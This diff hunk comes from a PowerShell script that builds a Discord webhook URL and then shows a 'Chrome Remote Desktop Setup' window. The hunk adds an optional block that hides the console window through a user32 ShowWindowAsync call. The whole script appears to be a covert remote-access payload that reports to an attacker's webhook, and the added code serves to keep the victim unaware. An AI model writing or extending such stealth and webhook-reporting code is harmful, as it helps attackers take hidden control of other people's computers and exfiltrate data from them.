@@ -20,6 +20,23 @@ if ($dc.Length -lt 120){
 	$dc = ("https://discord.com/api/webhooks/" + "$dc")
 }
 
+# Uncomment $hide='y' below to hide the console
+
+# $hide='y'
+if($hide -eq 'y'){
+    $w=(Get-Process -PID $pid).MainWindowHandle
+    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
+    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
+    if($w -ne [System.IntPtr]::Zero){
+        $t::ShowWindowAsync($w,0)
+    }else{
+        $Host.UI.RawUI.WindowTitle = 'xx'
+        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
+        $w=$p.MainWindowHandle
+        $t::ShowWindowAsync($w,0)
+    }
+}
+
 $setupwindow = New-Object System.Windows.Forms.Form
 $setupwindow.ClientSize = '600,450'
 $setupwindow.Text = "Chrome Remote Desktop Setup"
